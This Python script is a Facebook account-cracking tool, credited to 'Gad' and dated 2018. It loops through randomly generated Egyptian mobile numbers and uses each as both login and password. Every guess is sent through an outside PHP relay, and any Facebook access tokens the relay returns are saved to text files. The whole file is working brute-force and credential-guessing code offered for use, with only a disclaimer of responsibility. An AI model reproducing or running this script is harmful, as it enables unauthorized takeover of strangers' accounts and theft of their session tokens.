#!/usr/bin/python
#coding: utf-8
#Code By : Gad
import requests, json
import random
import string
import time

gad ="[+]Facebook Get Token By Combo [+]\n[+]Coded: @Gad990   (Telegram)[+]\n Date: 26/01/2018 \n[+]Changing the Description of this tool Won't made you the coder ^_^[+]\n[+]I take no responsibilities for the use of this program[+] "
print(gad)
a = 0
while 1:
	for x in range(0, 1000000):
		num0 = random.choice(['011', '010', '012'])
		num = num0 + ''.join(random.choice("0123456789" + string.digits) for _ in range(8))
		url = 'http://ahmed-gad-for-dev-com.stackstaging.com/gad.php?u='+num+'&p='+num+''
		http = requests.post(url)
		content = http.content
		data = json.loads(content.decode("utf-8"))
		print('ok')
		if "session_key" in data:
				a += 1
				print("There is ") + str(a) + " Account Work" + ', number is =  ' + num
				path = 'access.txt'
				access = open(path, 'a')
				access.write(data["access_token"] + '\n')
				access.close()
				path1 = 'phone.txt'
				phone = open(path1, 'a')
				phone.write(num + '\n')
				phone.close()
				path2 = 'phoneandaccess.txt'
				allv = open(path2, 'a')
				allv.write( num + ' = ' + data["access_token"] + '\n')
				allv.close()
	time.sleep(0)
